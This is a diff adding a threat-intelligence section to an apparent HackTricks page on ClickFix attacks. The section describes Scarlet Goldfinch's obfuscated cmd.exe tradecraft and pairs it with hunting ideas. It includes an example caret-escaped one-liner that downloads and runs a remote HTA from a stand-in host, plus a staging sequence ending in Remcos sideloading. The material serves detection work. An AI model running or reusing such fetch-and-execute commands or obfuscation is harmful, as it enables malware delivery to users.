@@ -211,6 +211,37 @@ Detection/hunting tips for these variants
 - Network: outbound to CDN worker hosts or blockchain RPC endpoints from script hosts/PowerShell shortly after web browsing.
 - File/registry: temporary `.ps1` creation under `%TEMP%` plus RunMRU entries containing these one-liners; block/alert on signed-script LOLBAS (WScript/cscript/mshta) executing with external URLs or obfuscated alias strings.
 
+### Scarlet Goldfinch Epoch 7: `cmd.exe /v:on` + split `curl`/`mshta` + Remcos sideload
+
+Red Canary's March 2026 reporting shows Scarlet Goldfinch keeping the same ClickFix outcome while rapidly changing the pasted command line to break brittle detections:
+
+- **Detection-surface swap:** late-January 2026 commands replaced `forfiles` with `if exist C:\\Windows\\System32\\notepad.exe` as a gate before running the rest of the chain, preserving the "check for Notepad" logic while removing `forfiles`-specific detections.
+- **Split download and execution:** instead of letting `mshta.exe` fetch remote content itself, `cmd.exe` calls `curl.exe` to download an `.hta` to disk and then launches the local file with `mshta.exe`. This means `mshta.exe` may appear only as an execution child with **no direct network connection**.
+- **Delayed-expansion obfuscation:** `cmd.exe /v:on` enables runtime variables that hold the download path and cleanup logic, then executes and deletes the HTA in one chained command line.
+- **CMD keyword scrambling:** actors insert caret escapes into LOLBAS names, e.g. `^c^u^r^l^`, `^m^s^h^t^a^`, or `^s^t^a^r^t^`, so naive string-matching rules miss the real token.
+- **Substring-index reconstruction:** delayed variables can hide the command name entirely, e.g. setting `l=ycyyruyly` and rebuilding `curl` from selected character offsets at execution time.
+
+Example pattern:
+
+```cmd
+cmd.exe /v:on /c "set h=%TEMP%\a.hta && c^u^r^l^ -o !h! https://example[.]com/p && m^s^h^t^a^ !h! && del !h!"
+```
+
+Post-HTA staging observed in the same Scarlet Goldfinch chain:
+
+1. Create a **7-10 digit** staging directory under `%LOCALAPPDATA%`.
+2. Download an archive **masquerading as a PDF** with `curl.exe`.
+3. Extract it with Windows `tar -xf`.
+4. Execute the trusted EXE either directly from `cmd.exe` or through PowerShell `Invoke-CimMethod`, causing **DLL sideloading** of Remcos.
+5. Use Remcos to install or persist **NetSupport Manager**.
+
+Hunting ideas for this Epoch 7 tradecraft
+- `explorer.exe` / browser ancestry followed by `cmd.exe /v:on` and multiple `&&`-chained LOLBAS calls.
+- `curl.exe` downloading `.hta` files immediately followed by `mshta.exe` opening a local path instead of a URL.
+- Caret-heavy command lines or `set <var>=<junk>` plus delayed-expansion substring syntax used to reconstruct `curl`/`mshta`.
+- `%LOCALAPPDATA%\\<7-10 digits>\\` staging folders, `tar -xf` against a `.pdf` file, and execution of a newly unpacked vendor-signed EXE from that directory.
+- PowerShell `Invoke-CimMethod -ClassName Win32_Process -MethodName Create` launching an EXE from a fresh `%LOCALAPPDATA%` folder shortly after the ClickFix command.
+
 ## Mitigations
 
 1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) or require user gesture.
@@ -234,5 +265,6 @@ Detection/hunting tips for these variants
 - [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
 - [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
 - [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
+- [Scarlet Goldfinch’s year in ClickFix](https://redcanary.com/blog/threat-intelligence/scarlet-goldfinch-clickfix/)
 
 {{#include ../../banners/hacktricks-training.md}}
